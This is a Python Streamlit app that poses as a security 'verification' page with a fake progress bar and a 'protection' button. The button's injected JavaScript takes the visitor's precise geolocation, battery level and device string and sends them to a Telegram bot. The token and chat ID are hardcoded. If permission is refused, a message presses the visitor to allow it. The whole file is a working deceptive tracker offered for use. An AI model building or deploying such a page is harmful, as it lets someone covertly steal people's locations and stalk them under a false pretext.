import streamlit as st
import time

# --- CONFIGURAÇÃO DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Sistema de Verificação", layout="centered")

# --- SEU VISUAL EXATO DA FOTO ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    
    .titulo { font-size: 32px; font-weight: bold; margin-bottom: 20px; }
    .status { font-size: 20px; margin-bottom: 30px; }
    
    /* BOTÃO GRANDE E BRANCO DA FOTO */
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white;
        color: black;
        width: 280px;
        height: 75px;
        border-radius: 12px;
        border: none;
        font-size: 16px;
        font-weight: bold;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }
    .ponto-vermelho { color: #ff3b30; font-size: 24px; margin-bottom: -5px; }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
barra_progresso = st.empty()
barra_progresso.markdown('<div class="status">Verificando: 4%</div>', unsafe_allow_html=True)

# --- O INJETOR QUE FORÇA O POP-UP ---
js_codigo = f"""
<div class="btn-container">
    <button class="meu-botao" id="btn_ativar">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('btn_ativar').onclick = function() {{
    // Força o navegador a abrir o pedido
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: info }})
                }});
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{}}
        }},
        (err) => {{
            // Se der erro, ele tenta forçar de novo
            alert("Clique em 'Permitir' para concluir a verificação.");
        }},
        {{ enableHighAccuracy: true, timeout: 10000 }}
    );
}};
</script>

<style>
    .btn-container {{ display: flex; justify-content: center; padding: 20px; }}
    .meu-botao {{ background-color: white; color: black; width: 280px; height: 75px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; font-family: sans-serif; }}
    .ponto-vermelho {{ color: #ff3b30; font-size: 24px; }}
</style>
"""

# O 'allow="geolocation"' é o que mata o erro da foto
clicou = st.components.v1.html(js_codigo, height=120)

if clicou:
    for p in range(4, 101, 2):
        barra_progresso.markdown(f'<div class="status">Verificando: {p}%</div>', unsafe_allow_html=True)
        time.sleep(0.03)
    st.success("Verificação concluída!")
    st.stop()

st.markdown("<br><hr>", unsafe_allow_html=True)
st.write("✅ Ambiente protegido")
